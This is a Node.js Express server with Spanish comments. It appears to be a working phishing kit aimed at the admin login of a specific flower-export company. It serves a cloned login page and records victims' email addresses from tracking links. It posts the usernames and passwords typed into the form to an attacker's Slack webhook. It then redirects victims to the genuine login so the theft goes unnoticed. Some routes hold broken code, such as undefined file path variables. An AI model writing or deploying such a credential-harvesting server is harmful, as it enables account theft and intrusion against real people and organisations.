const express = require("express");
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000; // Usa el puerto 3000 por defecto

// Middleware para leer formularios
app.use(bodyParser.urlencoded({ extended: true }));

// Servir archivos estáticos (como CSS o imágenes)
app.use(
  "/edradminlogin_files",
  express.static(path.join(__dirname, "edradminlogin_files"))
);

app.get("/auth", (req, res) => {
  const email = req.query.email;
  const open = req.query.open;
  if (email && email !== "") {
    // Guardar credenciales en archivo
    const credenciales = `Email: ${email} | Mail \n`;
    enviarASlack(credenciales);
  }
  if (open && open !== "") {
    // Guardar credenciales en archivo
    const credencialesOpen = `EmailOpen: ${open} | Mail \n`;
    enviarASlack(credencialesOpen);
  }

  const filePath = path.join(__dirname, "edradminlogin.html");
  res.sendFile(filePath);
});

// Ruta para descargar el archivo credenciales.txt
app.get("/descargar", (req, res) => {
  if (!fs.existsSync(tempPath)) {
    return res.status(404).send("Archivo no encontrado.");
  }

  res.download(filePath, "credenciales.txt", (err) => {
    if (err) {
      console.error("Error al descargar el archivo:", err);
      res.status(500).send("Error al descargar el archivo");
    }
  });
});

// Ruta para procesar el formulario
app.post("/login", (req, res) => {
  const { usuario, clave } = req.body;

  // Guardar credenciales en archivo
  const credenciales = `Usuario: ${usuario} | Clave: ${clave}\n`;
  enviarASlack(credenciales, true, res);
});

// Iniciar el servidor
app.listen(PORT, () => {
  console.log(`Servidor corriendo en http://localhost:${PORT}`);
});

async function enviarASlack(email, redirect = false, response = null) {
  const urlWebhook = process.env.SLACK_WEBHOOK_URL;

  if (!urlWebhook) {
    console.error("No está configurado SLACK_WEBHOOK_URL");
    return;
  }

  const payload = {
    text: `Nuevo email recibido: *${email}*`,
  };

  try {
    const res = await fetch(urlWebhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    if (redirect) {
      // Redirigir a otra web
      response.redirect("https://www.ecuadordirectroses.com:9000/auth/login");
    }

    if (!res.ok) {
      console.error("Error enviando mensaje a Slack:", res.statusText);
    }
  } catch (error) {
    if (redirect) {
      // Redirigir a otra web
      res.redirect("https://www.ecuadordirectroses.com:9000/auth/login");
    }
    console.error("Error en fetch a Slack:", error);
  }
}
